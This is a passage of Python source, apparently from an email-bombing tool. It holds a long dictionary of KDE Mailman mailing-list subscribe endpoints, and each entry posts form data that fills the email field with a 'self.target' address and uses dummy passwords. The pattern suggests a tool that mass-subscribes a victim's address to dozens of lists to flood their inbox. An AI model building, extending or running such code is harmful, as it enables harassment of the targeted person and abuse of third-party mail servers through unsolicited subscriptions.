                'url': 'https://mail.kde.org/mailman/subscribe/gcompris-portugues',
                'token_url': 'https://mail.kde.org/mailman/listinfo/gcompris-portugues',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vDrVW': {
                'url': 'https://mail.kde.org/mailman/subscribe/gwenview-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/gwenview-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QUKhE': {
                'url': 'https://mail.kde.org/mailman/subscribe/heaptrack',
                'token_url': 'https://mail.kde.org/mailman/listinfo/heaptrack',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HBxYz': {
                'url': 'https://mail.kde.org/mailman/subscribe/k3b',
                'token_url': 'https://mail.kde.org/mailman/listinfo/k3b',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AInfy': {
                'url': 'https://mail.kde.org/mailman/subscribe/kalzium',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kalzium',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BjdaC': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PJPbc': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-accessibility',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-accessibility',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wRpgs': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-android',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-android',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JQoAq': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-announce',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cSlfG': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-announce-apps',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-announce-apps',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vTWDB': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-artists',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-artists',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'eSeWN': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-at',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-at',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ogeIB': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-bindings',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-bindings',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vPyUZ': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-br',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-br',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mRvTh': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-bugs-dist',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-bugs-dist',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hjAva': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-buildsystem',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-buildsystem',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LTHMD': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-china',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-china',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kuNqj': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-commits',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-commits',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MytwX': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-community',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-community',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VFEii': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-core-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-core-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZcMLX': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-dashboard',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-dashboard',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sdNAo': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-de',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-de',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OdMJX': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NaFuY': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-devel-es',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-devel-es',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'loyWk': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-doc-english',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-doc-english',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DSOPN': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-edu',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-edu',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kwDAT': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-edu-pt_br',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-edu-pt_br',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Wzjym': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-el',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-el',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jtCUY': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-embedded',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-embedded',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pZgnU': {
                'url': 'http://mail.kde.org/cgi-bin/mailman/subscribe/kde-ev-free-qt-wg',
                'token_url': 'http://mail.kde.org/cgi-bin/mailman/listinfo/kde-ev-free-qt-wg',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HUaNC': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-events-in',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-events-in',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bDDZy': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-finance-apps',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-finance-apps',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kqAhh': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-frameworks-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-frameworks-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OyRIH': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-francophone',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-francophone',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sJvnD': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-freebsd',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-freebsd',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HmpFE': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-games-bugs',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-games-bugs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JHqIv': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-games-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-games-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AhXMi': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-gardening',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-gardening',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pWVmM': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-i18n-ca',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-i18n-ca',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ovZAe': {
                'url': 'http://mail.kde.org/cgi-bin/mailman/subscribe/kde-i18n-cs',
                'token_url': 'http://mail.kde.org/cgi-bin/mailman/listinfo/kde-i18n-cs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BGmmB': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-i18n-de',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-i18n-de',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'glQGD': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-i18n-doc',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-i18n-doc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jUTsN': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-i18n-el',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-i18n-el',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mAcQw': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-i18n-eo',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-i18n-eo',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ooPZf': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-i18n-eu',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-i18n-eu',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bbqDR': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-i18n-fa',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-i18n-fa',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iSKge': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-i18n-it',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-i18n-it',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JjNCf': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-i18n-lt',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-i18n-lt',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TtlYG': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-i18n-nl',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-i18n-nl',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hYJMO': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-i18n-pt',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-i18n-pt',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vCHny': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-i18n-pt_br',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-i18n-pt_br',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gCboQ': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-i18n-ro',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-i18n-ro',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fOcUJ': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-i18n-sr',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-i18n-sr',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AdXMk': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-i18n-uk',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-i18n-uk',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OBPyE': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-india',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-india',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zagEZ': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-italia',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-italia',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wnkTj': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-jp',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-jp',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SquNn': {
                'url': 'http://mail.kde.org/cgi-bin/mailman/subscribe/kde-kr',
                'token_url': 'http://mail.kde.org/cgi-bin/mailman/listinfo/kde-kr',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VUyDZ': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-l10n-en_gb',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-l10n-en_gb',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UBIeH': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-l10n-es',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-l10n-es',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vetQJ': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-l10n-he',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-l10n-he',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cujSy': {
                'url': 'http://mail.kde.org/cgi-bin/mailman/subscribe/kde-l10n-hi',
                'token_url': 'http://mail.kde.org/cgi-bin/mailman/listinfo/kde-l10n-hi',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kfihk': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-l10n-hu',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-l10n-hu',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xILoL': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-l10n-ia',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-l10n-ia',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wShIA': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-l10n-in',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-l10n-in',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'aYlNO': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-l10n-kn',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-l10n-kn',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PJOPe': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-l10n-si',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-l10n-si',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BpgmR': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-l10n-sw',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-l10n-sw',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gGTqw': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-l10n-tr',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-l10n-tr',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AjPHq': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-l10n-vi',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-l10n-vi',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GtJbL': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-latam',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-latam',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jOkFU': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-linux',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-linux',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rsprK': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-look',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-look',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jJDdx': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-mac',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-mac',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hrnVB': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-mexico',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-mexico',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uUptu': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-multimedia',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-multimedia',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rGnqc': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-nonlinux',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-nonlinux',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'aKKTP': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-partnership',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-partnership',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uQiDP': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-pim',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-pim',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AGilN': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-print-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-print-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UdPMe': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-promo',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-promo',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XWvwZ': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-scm-interest',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-scm-interest',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QToPU': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-soc',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-soc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GiNFS': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-soc-management',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-soc-management',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'yxndc': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-speech',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-speech',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'eakBi': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-telepathy',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-telepathy',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xxBda': {
